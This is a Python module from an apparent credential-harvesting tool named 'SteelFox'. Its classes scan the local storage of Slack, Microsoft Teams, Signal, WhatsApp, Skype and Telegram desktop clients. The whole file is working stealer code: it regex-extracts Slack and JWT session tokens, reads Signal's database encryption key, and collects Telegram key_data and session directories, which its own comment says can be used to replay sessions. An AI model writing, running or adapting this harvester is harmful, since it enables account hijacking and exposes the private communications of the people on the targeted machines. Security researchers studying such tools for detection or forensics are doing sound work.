# -*- coding: utf-8 -*-
"""
SteelFox — Slack, Teams & Signal Token / Session Recovery

Recovers tokens and session data from:
  - Slack Desktop
  - Microsoft Teams (new & classic)
  - Signal Desktop
  - WhatsApp Desktop
  - Skype
"""

from __future__ import annotations

import json
import logging
import os
import re
from pathlib import Path
from typing import Any

from steelfox.core.config import config
from steelfox.core.module_base import Category, ModuleBase, ModuleMeta

logger = logging.getLogger("steelfox")


# ═══════════════════════════════════════════════════════════════════════════
# Slack
# ═══════════════════════════════════════════════════════════════════════════

class Slack(ModuleBase):
    """Recover Slack workspace tokens from desktop storage."""

    meta = ModuleMeta(
        name="Slack",
        category=Category.MESSAGING,
        description="Recover Slack workspace authentication tokens",
    )

    SLACK_PATHS = [
        "{APPDATA}\\Slack\\Local Storage\\leveldb",
        "{APPDATA}\\Slack\\storage",
    ]

    TOKEN_PATTERN = re.compile(r"xoxc-[\w-]+|xoxs-[\w-]+|xoxr-[\w-]+|xoxb-[\w-]+|xoxp-[\w-]+")

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        seen: set[str] = set()

        for tmpl in self.SLACK_PATHS:
            path = self._resolve(tmpl)
            if not path or not Path(path).exists():
                continue

            tokens = self._scan_for_tokens(Path(path))
            for token in tokens:
                if token not in seen:
                    seen.add(token)
                    token_type = token.split("-")[0]
                    results.append(self._make_credential(
                        source="Slack",
                        username=f"Slack Token ({token_type})",
                        password=token,
                        extra={"Type": token_type},
                    ))

        # Also check Slack cookies/config
        cookies_path = self._resolve("{APPDATA}\\Slack\\Cookies")
        if cookies_path and Path(cookies_path).exists():
            results.append({
                "Source": "Slack",
                "Type": "Cookie Database",
                "Path": cookies_path,
            })

        return results

    def _scan_for_tokens(self, directory: Path) -> list[str]:
        tokens: list[str] = []
        for ext in ("*.log", "*.ldb", "*.json"):
            for f in directory.rglob(ext):
                try:
                    content = f.read_bytes().decode("utf-8", errors="ignore")
                    tokens.extend(self.TOKEN_PATTERN.findall(content))
                except Exception:
                    continue
        return list(set(tokens))

    @staticmethod
    def _resolve(template: str) -> str | None:
        try:
            result = template
            for k, v in config.profile.items():
                result = result.replace(f"{{{k}}}", v)
            return result
        except Exception:
            return None


# ═══════════════════════════════════════════════════════════════════════════
# Microsoft Teams
# ═══════════════════════════════════════════════════════════════════════════

class MicrosoftTeams(ModuleBase):
    """Recover Microsoft Teams authentication tokens and session data."""

    meta = ModuleMeta(
        name="Microsoft Teams",
        category=Category.MESSAGING,
        description="Recover Microsoft Teams tokens and cached credentials",
    )

    TEAMS_PATHS = [
        # New Teams (Teams 2.0)
        "{LOCALAPPDATA}\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams",
        # Classic Teams
        "{APPDATA}\\Microsoft\\Teams",
        "{APPDATA}\\Microsoft\\Teams\\Local Storage\\leveldb",
    ]

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        for tmpl in self.TEAMS_PATHS:
            path = self._resolve(tmpl)
            if not path or not Path(path).exists():
                continue

            p = Path(path)

            # Check for Cookies file
            for cookies_file in p.rglob("Cookies"):
                results.append({
                    "Source": "Microsoft Teams",
                    "Type": "Cookie Database",
                    "Path": str(cookies_file),
                })

            # Check for leveldb storage
            for ldb_dir in p.rglob("leveldb"):
                if ldb_dir.is_dir():
                    tokens = self._scan_leveldb(ldb_dir)
                    for token in tokens:
                        results.append(self._make_credential(
                            source="Microsoft Teams",
                            username="Teams Token",
                            password=token,
                        ))

            # Check for storage.json (classic Teams)
            storage_json = p / "storage.json"
            if storage_json.exists():
                try:
                    data = json.loads(storage_json.read_text(encoding="utf-8"))
                    for key in data:
                        if "token" in key.lower() or "auth" in key.lower():
                            results.append({
                                "Source": "Microsoft Teams",
                                "Type": f"Config: {key}",
                                "Value": str(data[key])[:200],
                            })
                except Exception:
                    pass

        return results

    @staticmethod
    def _scan_leveldb(ldb_dir: Path) -> list[str]:
        tokens: list[str] = []
        token_pattern = re.compile(r"eyJ[\w-]+\.eyJ[\w-]+\.[\w-]+")  # JWT pattern
        for ext in ("*.log", "*.ldb"):
            for f in ldb_dir.glob(ext):
                try:
                    content = f.read_bytes().decode("utf-8", errors="ignore")
                    tokens.extend(token_pattern.findall(content))
                except Exception:
                    continue
        return list(set(tokens))

    @staticmethod
    def _resolve(template: str) -> str | None:
        try:
            result = template
            for k, v in config.profile.items():
                result = result.replace(f"{{{k}}}", v)
            return result
        except Exception:
            return None


# ═══════════════════════════════════════════════════════════════════════════
# Signal Desktop
# ═══════════════════════════════════════════════════════════════════════════

class Signal(ModuleBase):
    """Recover Signal Desktop encryption key and session data."""

    meta = ModuleMeta(
        name="Signal",
        category=Category.MESSAGING,
        description="Recover Signal Desktop encryption key and database location",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        signal_path = self._resolve("{APPDATA}\\Signal")
        if not signal_path or not Path(signal_path).exists():
            return results

        base = Path(signal_path)

        # config.json contains the encryption key for the local database
        config_file = base / "config.json"
        if config_file.exists():
            try:
                data = json.loads(config_file.read_text(encoding="utf-8"))
                enc_key = data.get("key", "")
                if enc_key:
                    results.append(self._make_credential(
                        source="Signal Desktop",
                        username="Database Encryption Key",
                        password=enc_key,
                        extra={"Type": "SQLCipher Key"},
                    ))
            except Exception as e:
                logger.debug("Signal config.json parse failed: %s", e)

        # Database location
        db_file = base / "sql" / "db.sqlite"
        if db_file.exists():
            results.append({
                "Source": "Signal Desktop",
                "Type": "Encrypted Database",
                "Path": str(db_file),
                "Size": f"{db_file.stat().st_size:,} bytes",
            })

        return results

    @staticmethod
    def _resolve(template: str) -> str | None:
        try:
            result = template
            for k, v in config.profile.items():
                result = result.replace(f"{{{k}}}", v)
            return result
        except Exception:
            return None


# ═══════════════════════════════════════════════════════════════════════════
# WhatsApp Desktop
# ═══════════════════════════════════════════════════════════════════════════

class WhatsApp(ModuleBase):
    """Recover WhatsApp Desktop session data."""

    meta = ModuleMeta(
        name="WhatsApp",
        category=Category.MESSAGING,
        description="Identify WhatsApp Desktop session and storage locations",
    )

    WHATSAPP_PATHS = [
        "{APPDATA}\\WhatsApp",
        "{LOCALAPPDATA}\\WhatsApp",
        "{LOCALAPPDATA}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalCache",
    ]

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        for tmpl in self.WHATSAPP_PATHS:
            path = self._resolve(tmpl)
            if not path or not Path(path).exists():
                continue

            base = Path(path)

            # IndexedDB / localStorage
            for ldb_dir in base.rglob("leveldb"):
                if ldb_dir.is_dir():
                    results.append({
                        "Source": "WhatsApp Desktop",
                        "Type": "Local Storage (leveldb)",
                        "Path": str(ldb_dir),
                    })

            # Session storage
            for session_dir in base.rglob("Session Storage"):
                if session_dir.is_dir():
                    results.append({
                        "Source": "WhatsApp Desktop",
                        "Type": "Session Storage",
                        "Path": str(session_dir),
                    })

            # Databases
            for db_file in base.rglob("*.db"):
                results.append({
                    "Source": "WhatsApp Desktop",
                    "Type": "Database",
                    "Path": str(db_file),
                    "Size": f"{db_file.stat().st_size:,} bytes",
                })

        return results

    @staticmethod
    def _resolve(template: str) -> str | None:
        try:
            result = template
            for k, v in config.profile.items():
                result = result.replace(f"{{{k}}}", v)
            return result
        except Exception:
            return None


# ═══════════════════════════════════════════════════════════════════════════
# Skype
# ═══════════════════════════════════════════════════════════════════════════

class Skype(ModuleBase):
    """Recover Skype session data and credentials."""

    meta = ModuleMeta(
        name="Skype",
        category=Category.MESSAGING,
        description="Recover Skype stored credentials and session data",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        skype_paths = [
            self._resolve("{APPDATA}\\Microsoft\\Skype for Desktop"),
            self._resolve("{APPDATA}\\Skype"),
        ]

        for path in skype_paths:
            if not path or not Path(path).exists():
                continue

            base = Path(path)

            # Local Storage
            for ldb_dir in base.rglob("leveldb"):
                if ldb_dir.is_dir():
                    results.append({
                        "Source": "Skype",
                        "Type": "Local Storage",
                        "Path": str(ldb_dir),
                    })

            # SQLite databases
            for db in base.rglob("*.db"):
                results.append({
                    "Source": "Skype",
                    "Type": "Database",
                    "Name": db.name,
                    "Path": str(db),
                })

            # Config files
            for cfg in base.rglob("*.json"):
                if "token" in cfg.name.lower() or "config" in cfg.name.lower():
                    try:
                        data = json.loads(cfg.read_text(encoding="utf-8"))
                        for key in data:
                            if any(kw in key.lower() for kw in ["token", "auth", "cookie", "session"]):
                                results.append(self._make_credential(
                                    source="Skype",
                                    username=key,
                                    password=str(data[key])[:200],
                                ))
                    except Exception:
                        continue

        return results

    @staticmethod
    def _resolve(template: str) -> str | None:
        try:
            result = template
            for k, v in config.profile.items():
                result = result.replace(f"{{{k}}}", v)
            return result
        except Exception:
            return None


# ═══════════════════════════════════════════════════════════════════════════
# Telegram Desktop
# ═══════════════════════════════════════════════════════════════════════════

class Telegram(ModuleBase):
    """Recover Telegram Desktop session files and account data.

    Telegram Desktop stores session keys in the `tdata/` directory.
    The key files (key_data) and session directories contain data
    that can be used to replay sessions.
    """

    meta = ModuleMeta(
        name="Telegram",
        category=Category.MESSAGING,
        description="Recover Telegram Desktop session data, account info, and key files",
    )

    # Known Telegram client tdata paths
    TDATA_PATHS = [
        "{APPDATA}\\Telegram Desktop\\tdata",
        "{APPDATA}\\Telegram Desktop Beta\\tdata",
        "{APPDATA}\\64Gram Desktop\\tdata",
        "{APPDATA}\\AyuGram Desktop\\tdata",
        "{APPDATA}\\Unigram\\tdata",
    ]

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        for path_template in self.TDATA_PATHS:
            tdata_path = self._resolve(path_template)
            if not tdata_path or not Path(tdata_path).exists():
                continue

            tdata = Path(tdata_path)
            client = tdata.parent.name

            # Key data file (contains the local encryption key)
            key_data = tdata / "key_data"
            if key_data.exists():
                try:
                    raw = key_data.read_bytes()
                    results.append({
                        "Source": f"Telegram ({client})",
                        "Type": "Encryption Key (key_data)",
                        "Path": str(key_data),
                        "Size": f"{len(raw)} bytes",
                        "Key Preview (hex)": raw[:64].hex(),
                    })
                except Exception:
                    pass

            # Session files (hex-named directories = account sessions)
            for entry in tdata.iterdir():
                if entry.is_dir() and len(entry.name) == 16 and all(
                    c in "0123456789ABCDEFabcdef" for c in entry.name
                ):
                    session_files: list[str] = []
                    total_size = 0
                    for sf in entry.rglob("*"):
                        if sf.is_file():
                            session_files.append(sf.name)
                            total_size += sf.stat().st_size

                    if session_files:
                        results.append({
                            "Source": f"Telegram ({client})",
                            "Type": "Session Directory",
                            "Account Hash": entry.name,
                            "Path": str(entry),
                            "File Count": str(len(session_files)),
                            "Total Size": f"{total_size:,} bytes",
                            "Files": ", ".join(session_files[:20]),
                        })

            # Map files (map0, map1 — account mapping)
            for map_file in ["map0", "map1", "map2"]:
                mf = tdata / map_file
                if mf.exists():
                    try:
                        raw = mf.read_bytes()
                        results.append({
                            "Source": f"Telegram ({client})",
                            "Type": f"Account Map ({map_file})",
                            "Path": str(mf),
                            "Size": f"{len(raw)} bytes",
                        })
                    except Exception:
                        pass

            # Settings files
            for settings_name in ["settings0", "settings1", "settings"]:
                sf = tdata / settings_name
                if sf.exists():
                    results.append({
                        "Source": f"Telegram ({client})",
                        "Type": "Settings File",
                        "Path": str(sf),
                        "Size": f"{sf.stat().st_size:,} bytes",
                    })

            # User tag
            usertag = tdata / "usertag"
            if usertag.exists():
                results.append({
                    "Source": f"Telegram ({client})",
                    "Type": "User Tag",
                    "Path": str(usertag),
                })

        return results

    @staticmethod
    def _resolve(template: str) -> str | None:
        try:
            result = template
            for k, v in config.profile.items():
                result = result.replace(f"{{{k}}}", v)
            return result
        except Exception:
            return None
